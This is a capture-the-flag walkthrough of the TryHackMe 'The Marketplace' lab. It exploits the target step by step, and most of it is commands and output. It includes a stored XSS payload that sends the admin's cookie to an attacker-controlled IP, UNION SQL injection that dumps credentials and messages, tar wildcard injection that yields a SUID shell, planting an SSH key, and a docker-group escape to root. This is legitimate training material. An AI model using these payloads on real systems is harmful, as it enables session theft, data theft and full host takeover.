# The Marketplace

Can you take over The Marketplace's infrastructure?

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

Room: https://tryhackme.com/room/marketplace

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/marketplace.md


## Target

```bash
export IP='10.65.172.61'
export URL="http://$IP:32768"
export ATTACKER_IP='10.65.80.63'
```

## Enumeration

Initial scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt $IP
```

Open ports:

```text
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js Express
```

The web application is **The Marketplace**.

Robots showed:

```text
/admin
```

The `/admin` page required an authenticated admin JWT.

---

## Account Creation and Initial Testing

Created a normal user account:

```text
username: test
```

After logging in, saved the JWT:

```bash
export USER_TOKEN='PASTE_USER_JWT_HERE'
```

The JWT decoded to a non-admin user:

```json
{
  "userId": 4,
  "username": "test",
  "admin": false
}
```

JWT cracking with `rockyou.txt` did not recover the signing secret:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
```

Result:

```text
Status: Exhausted
Recovered: 0/1
```

So JWT cracking was not the intended path.

---

## Stored XSS Discovery

The contact form was tested first:

```bash
curl -i "$URL/contact/test" \
  -X POST \
  -H "Cookie: token=$USER_TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://$ATTACKER_IP:8000/?c='+encodeURIComponent(document.cookie)\">"
```

When viewing the message, the payload was HTML-escaped:

```html
&lt;img src=x onerror=&#34;...&#34;&gt;
```

So the message body was not the XSS sink.

The next test was the listing description. A listener was started:

```bash
python3 -m http.server 8000
```

Created a listing containing the payload:

```bash
curl -i "$URL/new" \
  -X POST \
  -H "Cookie: token=$USER_TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'title=admin check please' \
  --data-urlencode "description=<img src=x onerror=\"new Image().src='http://$ATTACKER_IP:8000/?c='+encodeURIComponent(document.cookie)\">"
```

The listing was reported to the admin. When the admin bot viewed it, the listener received a request containing the admin cookie:

```text
GET /?c=token%3DeyJhbGciOi...
```

URL-decoding the value revealed an admin JWT for `michael`.

Saved it:

```bash
export ADMIN_TOKEN='PASTE_ADMIN_JWT_HERE'
```

Confirmed admin access:

```bash
curl -i "$URL/admin" \
  -H "Cookie: token=$ADMIN_TOKEN"
```

The admin panel listed users:

```text
system
michael
jake
test
```

---

## User Flag in Admin Panel

The admin panel contained the first flag:

```text
THM{c37a6389...48c348d5}
```

---

## SQL Injection in Admin User Parameter

The admin user view used a query parameter:

```text
/admin?user=2
```

Testing a UNION payload confirmed SQL injection:

```bash
curl -i "$URL/admin?user=2%20UNION%20SELECT%201,2,3--%20" \
  -H "Cookie: token=$ADMIN_TOKEN"
```

The server returned:

```text
ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT
```

Column count was found with UNION testing:

```bash
for n in 1 2 3 4 5 6 7 8 9 10; do
  cols=$(seq -s, 1 $n)
  echo "[*] UNION $n columns"
  curl -s "$URL/admin?user=2%20UNION%20SELECT%20$cols--%20" \
    -H "Cookie: token=$ADMIN_TOKEN" \
    | grep -Ei 'ER_WRONG|ER_|User |ID:|administrator|h2'
done
```

Four columns worked:

```text
UNION SELECT 1,2,3,4
```

Confirmed reflected columns:

```bash
curl -s "$URL/admin?user=2%20AND%201=0%20UNION%20SELECT%201,2,3,4--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Output showed column 2 reflected as the username value.

Database name:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,database(),3,4--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Result:

```text
marketplace
```

MySQL version:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,version(),3,4--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Result:

```text
8.0.21
```

Tables:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Result:

```text
items,messages,users
```

Users table columns:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name='users'--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Result:

```text
id,isAdministrator,password,username
```

Dumped usernames and bcrypt hashes:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,group_concat(username,0x3a,password),3,4%20FROM%20users--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

The hashes were bcrypt, which was too slow to brute-force practically on the AttackBox.

---

## Dumping Messages for Credentials

Messages table columns:

```bash
curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name='messages'--%20" \
  -H "Cookie: token=$ADMIN_TOKEN" \
  | grep -Ei 'User |ID:|administrator|h2'
```

Result:

```text
id,is_read,message_content,user_from,user_to
```

Dumped messages row-by-row:

```bash
for id in $(seq 1 30); do
  echo "[*] message $id"
  curl -s "$URL/admin?user=-1%20UNION%20SELECT%201,concat(id,0x3a,user_from,0x2d3e,user_to,0x3a,message_content),3,4%20FROM%20messages%20WHERE%20id=$id--%20" \
    -H "Cookie: token=$ADMIN_TOKEN" \
    | sed -n '/User /,/ID:/p'
done
```

Message 1 contained a temporary SSH password for user ID `3`, which is `jake`:

```text
system -> jake

Your new password is: @b_ENXk...v3zJ
```

---

## SSH as Jake

Logged in as `jake`:

```bash
ssh jake@$IP
```

Password:

```text
@b_ENXk...v3zJ
```

Read the user flag:

```bash
cat user.txt
```

Flag:

```text
THM{c3648ee7...da6dc0b4}
```

---

## Privilege Escalation: Jake to Michael

Checked sudo privileges:

```bash
sudo -l
```

Output:

```text
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

Inspected the script:

```bash
ls -la /opt/backups/backup.sh
cat /opt/backups/backup.sh
ls -la /opt/backups
```

Script contents:

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

The backup directory was world-writable with sticky bit:

```text
drwxrwxrwt /opt/backups
```

This allowed tar wildcard injection.

Created a payload:

```bash
cd /opt/backups

cat > shell.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/michaelbash
chmod 4755 /tmp/michaelbash
EOF

chmod +x shell.sh
```

Created tar option filenames:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=/bin/bash /opt/backups/shell.sh'
```

The existing `backup.tar` was owned by `jake`, so it had to be removed first or Michael could not overwrite it:

```bash
rm -f /opt/backups/backup.tar
```

Ran the allowed command:

```bash
sudo -u michael /opt/backups/backup.sh
```

Started the SUID bash shell:

```bash
/tmp/michaelbash -p
```

Confirmed effective Michael:

```bash
id
```

Output:

```text
uid=1000(jake) gid=1000(jake) euid=1002(michael)
```

This gave an effective Michael shell but not a proper login shell.

---

## Getting a Proper Michael SSH Session

Created Michael’s `.ssh` directory from the effective Michael shell:

```bash
mkdir -p /home/michael/.ssh
chmod 700 /home/michael/.ssh
```

Generated an SSH key on the AttackBox:

```bash
ssh-keygen -t ed25519 -f /tmp/marketplace_michael -N ''
cat /tmp/marketplace_michael.pub
```

Added the public key to Michael’s authorized keys:

```bash
echo 'PASTE_PUBLIC_KEY_HERE' >> /home/michael/.ssh/authorized_keys
chmod 600 /home/michael/.ssh/authorized_keys
```

Logged in as Michael:

```bash
ssh -i /tmp/marketplace_michael michael@$IP
```

Confirmed groups:

```bash
id
```

Output:

```text
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

Michael was in the `docker` group.

---

## Privilege Escalation: Michael to Root via Docker

Checked running containers:

```bash
docker ps
```

Output included:

```text
nginx
themarketplace_marketplace
mysql
```

Because Michael was in the `docker` group, Docker could be used to mount the host filesystem.

Used the local `nginx` image:

```bash
docker run --rm -it -v /:/mnt nginx chroot /mnt /bin/bash
```

This dropped into a root shell on the host filesystem.

Read the root flag:

```bash
cd /root
ls
cat root.txt
```

Root flag:

```text
THM{d4f76179...3c9abd62}
```

---

## Attack Chain Summary

```text
Nmap enumeration
→ Marketplace web app on Node.js/Express
→ Created normal user account
→ Tested JWT cracking, not successful
→ Found contact messages escaped HTML
→ Found stored XSS in listing description
→ Reported malicious listing to admin
→ Admin bot viewed listing
→ Stole Michael admin JWT
→ Accessed /admin
→ Found obfuscated user listing flag
→ SQL injection in /admin?user=
→ Dumped database tables manually
→ Dumped messages table
→ Found Jake temporary SSH password
→ SSH as jake
→ sudo -u michael /opt/backups/backup.sh
→ tar wildcard injection
→ SUID bash as effective Michael
→ Added SSH key for Michael
→ SSH as Michael
→ Michael in docker group
→ Mounted host filesystem using Docker
→ Read /root/root.txt
```

## Key Vulnerabilities

1. Stored XSS in marketplace listing description.
2. Admin bot viewed reported listings with an accessible JWT cookie.
3. SQL injection in `/admin?user=`.
4. Sensitive SSH password stored in messages table.
5. Unsafe sudo permission for `jake` to run a writable-directory backup script as `michael`.
6. Tar wildcard injection.
7. Michael was a member of the `docker` group, allowing host filesystem mount and root access.
